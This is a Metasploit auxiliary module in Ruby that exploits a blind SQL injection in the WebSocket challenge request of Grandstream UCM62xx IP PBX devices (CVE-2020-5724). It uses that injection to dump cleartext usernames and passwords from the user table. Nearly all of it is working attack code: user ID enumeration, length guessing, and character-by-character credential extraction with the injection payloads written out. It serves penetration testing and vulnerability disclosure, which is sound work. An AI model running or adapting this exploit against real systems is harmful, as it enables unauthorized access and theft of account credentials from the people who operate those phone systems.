##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Rex::Proto::Http::WebSocket
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Grandstream UCM62xx IP PBX WebSocket Blind SQL Injection Credential Dump',
        'Description' => %q{
          This module uses a blind SQL injection (CVE-2020-5724) affecting the Grandstream UCM62xx
          IP PBX to dump the user database. The injection occurs over a websocket at the websockify
          endpoint, and specifically occurs when the user requests the challenge (as part of a
          challenge and response authentication scheme). The injection is blind, but the server
          response contains a different status code if the query was successful. As such, the
          attacker can guess the contents of the user database. Most helpfully, the passwords are
          stored in cleartext within the user table (CVE-2020-5723).

          This issue was patched in Grandstream UCM62xx IP PBX frimware version 1.20.22.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7' # Vulnerability discovery, original poc, and Metasploit module
        ],
        'References' => [
          [ 'CVE', '2020-5724' ],
          [ 'CVE', '2020-5723'],
          [ 'URL', 'https://firmware.grandstream.com/Release_Note_UCM6xxx_1.0.20.22.pdf'],
          [ 'URL', 'https://raw.githubusercontent.com/tenable/poc/master/grandstream/ucm62xx/dump_http_user_creds.py']
        ],
        'DisclosureDate' => '2020-03-30',
        'DefaultOptions' => {
          'RPORT' => 8089,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptInt.new('STRING_FIELD_LENGTH', [true, 'The maximum length of the guessed username and/or password.', 16]),
      OptInt.new('ID_SCAN', [true, 'Total number of user IDs to try enumerate for valid users. 0 through (this number - 1)', 30])
    ])
  end

  # Craft the SQL injection into the challenge request
  def create_injection_request(query)
    id = Rex::Text.rand_text_alphanumeric(12)
    req = "{\"type\":\"request\",\"message\":{\"transactionid\":\"#{id}\",\"version\":\"1.0\",\"action\":\"challenge\",\"username\":\""
    req.concat(query)
    req.concat('"}}')
    req
  end

  # Retrieve the server's response and pull out the status response. The return value is
  # the server's response value (or 1 on failure).
  def recv_wsframe_status(wsock)
    res = wsock.get_wsframe
    return 1 unless res

    begin
      res_json = JSON.parse(res.payload_data)
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'Failed to parse the returned JSON response. ')
    end

    status = res_json.dig('message', 'status')
    return 1 if status.nil?

    status
  end

  # Guess valid user ids in the database. These are sequential (0, 1, 2, etc) with the default
  # admin user starting at 0. Return an array of valid ids.
  def guess_user_ids
    return_array = []

    datastore['ID_SCAN'].times do |n|
      wsock = connect_ws(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, '/websockify')
      )

      wsock.put_wstext(create_injection_request("' OR user_id=#{n}--"))
      next unless recv_wsframe_status(wsock) == 0

      return_array << n
    end

    return_array
  end

  # A generic injection to guess a fields length.
  def guess_field_length(id, field)
    datastore['STRING_FIELD_LENGTH'].times do |n|
      wsock = connect_ws(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, '/websockify')
      )

      wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND LENGTH(#{field})=#{n}--"))
      next unless recv_wsframe_status(wsock) == 0

      return n
    end

    return 0
  end

  # A generic injection to guess a string field. This implementation guesses all printable
  # characters (which is inline with allowed password values). It excludes \ since, while
  # the user can technically use it in a password, you can't actually log in if the character
  # is present. Returns the guessed value
  def guess_string(id, field, length)
    string = ''
    length.times do |n|
      (0x20...0x7e).each do |printable|

        next if printable == '\\'.ord

        char = printable.chr

        wsock = connect_ws(
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, '/websockify')
        )
        temp_string = string + char

        wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND substr(#{field},1,#{temp_string.length})='#{temp_string}'--"))
        next unless recv_wsframe_status(wsock) == 0

        string.concat(char)
        return string if string.length == length

        break
      end

      # if string.length != n+1 then we failed to guess a character
      return '' unless string.length == (n + 1)
    end

    ''
  end

  # Extract the version from the cgi endpoint and return true if the
  # reported version is affected by the vulnerability.
  def vulnerable_version?
    normalized_uri = normalize_uri(target_uri.path, '/cgi')
    print_status("Requesting version information from #{normalized_uri}")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalized_uri,
      'vars_post' => { 'action' => 'getInfo' }
    })

    return false unless res&.code == 200

    body_json = res.get_json_document
    return false if body_json.empty?

    prog_version = body_json.dig('response', 'prog_version')
    return false if prog_version.nil?

    print_status("The reported version is: #{prog_version}")

    version = Rex::Version.new(prog_version)
    version < Rex::Version.new('1.0.20.22')
  end

  def run_host(_ip)
    # do a version check so the attacker doesn't waste their time
    if !vulnerable_version?
      print_error('The reported version is not vulnerable.')
    end

    # attack happens in three parts:
    # - guess user ids
    # - for each id:
    #   - guess username
    #   - guess password
    discovered_ids = guess_user_ids
    print_status("Found #{discovered_ids.length} valid user ids")

    discovered_ids.each do |id|
      username_length = guess_field_length(id, 'user_name')
      next unless username_length != 0

      username = guess_string(id, 'user_name', username_length)
      next if username.empty?

      password_length = guess_field_length(id, 'user_password')
      next unless password_length != 0

      password = guess_string(id, 'user_password', password_length)
      next if password.empty?

      print_status("Found the following username and password: #{username} - #{password}")
      store_valid_credential(user: username, private: password)
    end
  end
end
